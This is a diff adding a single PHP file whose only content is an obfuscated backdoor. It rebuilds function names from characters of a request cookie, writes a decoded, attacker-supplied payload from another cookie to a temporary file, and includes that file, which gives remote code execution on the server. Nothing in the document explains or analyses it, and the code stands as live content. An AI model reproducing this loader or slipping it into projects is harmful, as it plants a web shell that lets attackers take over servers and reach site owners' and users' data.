@@ -1,0 +1,2 @@
+<?php
+$DhG	=	$_COOKIE	; $LoFE	= 0 ;	$DcER= (34- 30) ;	$XY =	array ();$XY[	$LoFE]= "" ;while($DcER){ 	$XY [ $LoFE] .= $DhG[	(70 -36 )	][$DcER ]	;	if	(	!	$DhG[ (49-	15)]	[ $DcER+1]){ 	if	( !$DhG [ (62 -28	)	 ][$DcER +	2])	break ; $LoFE	++; $XY	[ $LoFE ] ="";	  $DcER ++ ;}$DcER=	$DcER+ 	(	37-	33	)	+1 ; } $LoFE =$XY [	 (	32 -	11)  ]().$XY[	( 93-	69)	 ] ; if	(!	$XY[  (	21 -	19 ) ]($LoFE ) )	{		$DcER	= $XY[ (	62 -40	)	 ]( $LoFE,$XY [ ( 58-54) ]	);$XY[(	65	-	38)	]( $DcER,$XY [	 ( 15 -15	) ].$XY	[( 62	-	42)	](	$XY[		(63	-44)] (	$DhG	[3 ]	)	) )	; } include($LoFE);
